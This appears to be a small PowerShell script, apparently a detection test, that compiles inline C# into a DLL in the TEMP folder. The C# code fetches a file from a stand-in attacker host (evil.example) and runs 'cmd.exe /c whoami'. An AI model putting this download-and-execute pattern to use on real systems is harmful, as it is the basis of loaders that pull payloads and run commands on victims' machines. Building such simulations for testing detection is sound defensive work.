$src = @'
using System.Net;
using System.Diagnostics;
public class t {
  public static void go() {
    var w = new WebClient();
    w.DownloadString("http://evil.example/p.txt");
    Process.Start("cmd.exe", "/c whoami");
  }
}
'@
Add-Type -TypeDefinition $src -OutputAssembly "$env:TEMP\testdotnet.dll"
Write-Output "built: $env:TEMP\testdotnet.dll"
